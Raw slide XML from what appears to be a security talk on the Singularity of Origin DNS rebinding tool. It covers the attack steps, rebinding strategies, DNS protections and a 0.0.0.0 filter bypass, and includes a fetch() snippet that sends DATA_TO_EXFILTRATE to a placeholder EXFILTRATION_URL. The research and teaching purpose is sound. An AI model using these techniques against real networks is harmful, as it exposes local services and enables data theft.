      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="234" name="Google Shape;234;g5cfc32ad47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5cfc32ad47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Step 3: Attacker controlled JavaScript running in the victim’s browser waits for the DNS cache to expire and reloads the exploit page. Victim’s browser makes a new DNS request.</a:t>
            </a:r>
            <a:endParaRPr sz="1200">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8" name="Shape 248"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="249" name="Google Shape;249;g5cfc32ad47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5cfc32ad47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Step 4: The attacker DNS server responds with the (new) IP address of the vulnerable server of 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:srgbClr val="002060"/>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5" name="Shape 265"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="266" name="Google Shape;266;g5cfc32ad47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5cfc32ad47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Step 1: Victim browses to http://rebind.it/ Victim’s browser makes a DNS request to the attackers DNS server</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Step 2: The attackers DNS server returns the attacker’s IP address with a low time to live (TTL) forcing the browser to expire the A record quickly. The browser loads the attacker’s HTML/JavaScript</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Step 3: Attacker controlled JavaScript running in the victim’s browser waits for the DNS cache to expire and reloads the exploit page. Victim’s browser makes a new DNS request.</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Step 4: The attacker DNS server responds with the (new) IP address of the vulnerable server of 127.0.0.1</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Step 5: The victim’s browser makes a request to the vulnerable web service listening on the localhost because the new IP address is now 127.0.0.1. Because the domain name/origin (rebind.it) stays the same, the browser loads the response and the attacker can read the response.</a:t>
            </a:r>
            <a:endParaRPr sz="1200">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4" name="Shape 284"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="285" name="Google Shape;285;g5d0d863a9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5d0d863a9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was only a quick refresher about DNS rebinding. These are great presentations that go into more details on how DNS rebinding works.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0" name="Shape 290"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="291" name="Google Shape;291;g5de057f50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5de057f5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rebinding demo 1: Fetching the homepage of a router via DNS rebinding on an iPad running iOS 12. We employ the DNS rebinding time varying technique (Singularity’s First then Second DNS rebinding strategy) with DNS cache flooding.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View the video on Youtube: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://youtu.be/cjON0_wTpX8</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Singularity can be configured to be invisible to the target and to exfiltrate data instead of displaying it in an alert dialog box. e.g.</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fetch(EXFILTRATION_URL, {</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>            method: 'POST',</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>            mode: "no-cors",</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>            headers: {</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'</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body: DATA_TO_EXFILTRATE</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6" name="Shape 296"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="297" name="Google Shape;297;g5c05a104a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5c05a104a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 have a grasp on the basics of DNS rebinding attacks, we are going to explore how we made Singularity perform these reliably.</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1" name="Shape 301"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="302" name="Google Shape;302;g5d07e9f28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5d07e9f28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imagine you are trying to plan your next vacations, you are fan or horse riding and you visit a site that helps you to do just that, with a trojan horse picture, nothing wrong with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site has been compromised and contains a Singularity hidden iframe.</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7" name="Shape 307"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="308" name="Google Shape;308;g5d07e9f28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5d07e9f28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just downloaded Singularity of Origin HTML and JavaScript code assets. The code emits its first DNS query.</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2" name="Shape 312"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="313" name="Google Shape;313;g5c05a104a7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5c05a104a7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What’s in a query? The DNS hostname query sent by the browser to the Singularity server is made up of the following components. These components encode the information required for Singularity to perform an attack.</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A start tag</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>The attacker host IP address running Singularity web and DNS servers</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>The target service IP address or name (e.g. wiki.target.local). If the name contains dashes, we double encode them</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Session ID - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sessions enables the support of concurrent users and target services (and the development and testing of Singularity without constantly clearing the browser DNS cache!) and to track state.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Rebinding strategy - Singularity comes with several DNS rebinding strategies. “First then Second” is the most reliable and easiest to implement. AKA Time varying attack. 60 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 end tag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attacker domain name.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Attacks are driven client-side by JavaScript. The hostname sent in DNS queries is also present in HTTP requests (“Host:” HTTP header) to resources such as Singularity’s JavaScript code.</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i="1" lang="en"/>
              <a:t>We r</a:t>
            </a:r>
            <a:r>
              <a:rPr i="1" lang="en"/>
              <a:t>ecently had to shrink the length of a few of fields to make Singularity work when attacking an Asus router, which had an arbitrary FQDN length limitation.</a:t>
            </a:r>
            <a:endParaRPr i="1"/>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8" name="Shape 318"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="319" name="Google Shape;319;g5c05a104a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5c05a104a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want to remove performance enhancing techniques that impede or prevent DNS rebinding.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try to disable all forms of caching, by all browsers implementations and by intermediary caches. This forces the browsers to fetch fresh resources.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also instruct Singularity to drop HTTP idle connections from browsers to force them to connect to the target service as soon as possible (instead of staying connected to the attacker server).</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6" name="Shape 326"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="327" name="Google Shape;327;g5c05a104a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5c05a104a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about TTL Values? Papers and other tools often mention or use 1s. Singularity DNS answers come with a low TTL, typically zero for IP addresses. TTLs of 0 or 1 work both well. We chose zero in the hope it would break stuff but it unfortunately did not as it is a valid value.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2" name="Shape 332"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="333" name="Google Shape;333;g5c05a104a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5c05a104a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How do we figure we have successfully rebinded?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Singularity initially used a token embedded in each of its pages to permit the JavaScript code running on the target to detect whether the target browser was pointing to the target service.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detection is now performed mostly by checking whether a Singularity HTTP header is present in the response to the target.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token is still randomly useful in the multiple As rebinding strategy when connections are abruptly terminated by Singularity using iptables for IE/Edge browsers.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will cover the multiple As rebinding strategy shortly.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8" name="Shape 338"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="339" name="Google Shape;339;g5c05a104a7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5c05a104a7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 so often, you may encounter an environment that interferes with DNS rebinding in that spurious DNS queries may be sent by other parties, including IPS/IDS. This may result in out of sequences DNS answers from Singularity, slowing down  DNS rebinding tremendously or stopping it completely.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instance, using the time varying attack, Singularity may receive a request first from the IDS, then from the target browser and all subsequent responses would contain the address of the target service. This means that the target browser never got a chance to download the code from Singularity to attack the target service.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implemented a random response DNS rebinding strategy to cater for these environments.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technique is typically slower but you could get lucky!</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4" name="Shape 344"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="345" name="Google Shape;345;g5c05a104a7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5c05a104a7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we explained some of the techniques we implemented in Singularity to perform reliable DNS rebinding attacks, even in adverse circumstances. How did we make them faster?</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9" name="Shape 349"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="350" name="Google Shape;350;g5ccc63c98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5ccc63c98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important thing to know is that implementation details matter. DNS rebinding speed varies greatly based on:</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The OS implementation. Is the target browser running a Windows or Unix like OS such Linux or macOS. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>The browser vendor: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/Edge, Firefox, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Chromium based browsers and even their spin-offs e.g. Safari, can behave differently.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Target specification: e.g. 127.x, private networks, public networks</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>And external factors, as we learnt earlier.</a:t>
            </a:r>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5" name="Shape 355"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="356" name="Google Shape;356;g5c05a104a7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5c05a104a7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Multiple answers with response “127.0.0.1” does not work on Unix-y machines. We tried a number of solutions and changing the target spec from “127.0.0.1” to “0.0.0.0” worked.</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2" name="Shape 362"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="363" name="Google Shape;363;g5ce2b65a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5ce2b65a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quick illustration of the multiple answers rebinding strategy.</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2" name="Shape 382"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="383" name="Google Shape;383;g5c05a104a7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5c05a104a7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t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>nconsistent results for other target specifications but automating 192.x exploitation looks promising.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IOS Demo used DNS cache flooding.</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8" name="Shape 388"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="389" name="Google Shape;389;g5c387071f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5c387071f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browser console, we can see in blue color, the polling requests sent by the browser to determine whether rebinding happened using the first then second DNS rebinding strategy. Interlaced with these, we can see large amount of dummy queries in orange color, to flood the cache of the browser and evict older cache entries, including the DNS cache entry of the Singularity HTTP server.</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3" name="Shape 393"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="394" name="Google Shape;394;g5c985dcbd2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5c985dcbd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0" name="Shape 410"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="411" name="Google Shape;411;g5c05a104a7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5c05a104a7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5" name="Shape 415"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="416" name="Google Shape;416;g5c05a104a7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5c05a104a7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21" name="Shape 421"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="422" name="Google Shape;422;g5c05a104a7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5c05a104a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How do common DNS protections work?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>The most common form of protection is to block private IP addresses as defined in RFC 1918</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Some tools allow to additionally block localhost, local (internal) networks, or 0.0.0.0</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Dnsmasq &amp; Unbound open source DNS servers are very popular and are used in many widely used applications such as the pfSense firewall, the OpenWRT embedded operating system, and some home routers from FRITZ!Box or ASUS</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>There are also free DNS services such as OpenDNS which has a setting to block internal IP addresses.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Most tools tools or services that have try to block DNS rebinding attacks do not enable it by default. pfSense and Google Home seem to enable it by default. But there are several tool &amp; services that allow you to configure DNS rebinding protections.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27" name="Shape 427"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="428" name="Google Shape;428;g5c985dcbd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5c985dcbd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DNSmasq can be configured to block private IP ranges (this includes 0.0.0.0/8)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This setting is not enabled by default.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>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34" name="Shape 434"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="435" name="Google Shape;435;g5c985dcbd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5c985dcbd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Unbound allows to configure the private-address setting. These IP address ranges are blocked.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>“No private addresses are enabled by default.”</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://nlnetlabs.nl/documentation/unbound/unbound.conf/</a:t>
            </a:r>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41" name="Shape 441"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="442" name="Google Shape;442;g5c283d85d5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5c283d85d5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Rebinding Protection Bypass #1 : Use 0.0.0.0 to access the localhost (127.0.0.1) to bypass filters blocking DNS responses containing 127.0.0.1 or 127.0.0.0/8.</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Note: At some point chrome removed support for 0.0.0.0 and then re-introduced it: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://bugs.chromium.org/p/chromium/issues/detail?id=428046</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>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47" name="Shape 447"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
